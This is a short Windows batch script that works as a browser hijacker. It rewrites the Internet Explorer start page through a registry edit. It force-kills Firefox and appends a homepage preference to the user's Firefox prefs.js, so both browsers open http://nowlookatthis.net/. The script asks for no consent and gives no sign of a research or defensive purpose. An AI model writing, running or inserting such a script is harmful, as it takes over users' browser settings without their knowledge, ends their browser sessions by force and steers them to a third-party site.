@Echo off
REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F

taskkill /im firefox.exe* /f

cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
cd *.default
set ffile=%cd%
echo user_pref("browser.startup.homepage", "http://nowlookatthis.net/");>>"%ffile%\prefs.js"
set ffile=
cd %windir%
exit
